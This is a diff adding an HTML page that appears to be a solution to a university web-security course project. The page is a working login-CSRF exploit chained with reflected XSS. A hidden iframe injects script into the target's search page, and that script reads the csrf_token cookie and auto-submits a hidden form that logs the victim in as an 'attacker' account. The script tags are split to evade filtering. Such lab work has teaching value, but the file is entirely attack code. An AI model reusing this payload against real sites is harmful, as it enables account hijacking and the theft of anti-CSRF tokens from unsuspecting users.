@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<meta charset="utf-8" name="viewport" content="width=device-width", initial-scale=1">
+<head>
+	<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
+</head>
+
+<body>
+	<iframe id="myFrame_csrf" name="myFrame" style="width:0;height:0;border:0; border:none;"></iframe>
+
+	<script>
+		var path = "https://ecen5032.org/project2/search?csrfdefense=1&xssdefense=0&q=";
+		
+		var payload = "<form id='form_csrf' method='post' action='https://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0' target='myFrame'><input name='username' type='hidden' value='attacker'><input name='password' value='l33th4x' type='hidden'><input type='text' name='csrf_token'></form><scr"+"ipt>function steal_token(token_value){var token=document.cookie;var find_token=token.indexOf(token_value+'=');find_token=token.indexOf('=',find_token)+1;var position=token.indexOf(';',find_token);token=unescape(token.substring(find_token,position));return token;}$(\"input[name='csrf_token']\").val(steal_token('csrf_token'));$(\"#form_csrf\").submit();</scr"+"ipt>"; 	
+	
+		var url = path + encodeURIComponent(payload);
+		
+		$(function(){
+			$("#myFrame_csrf").attr("src", url);
+		});
+	</script>	
+</body>
+</html>
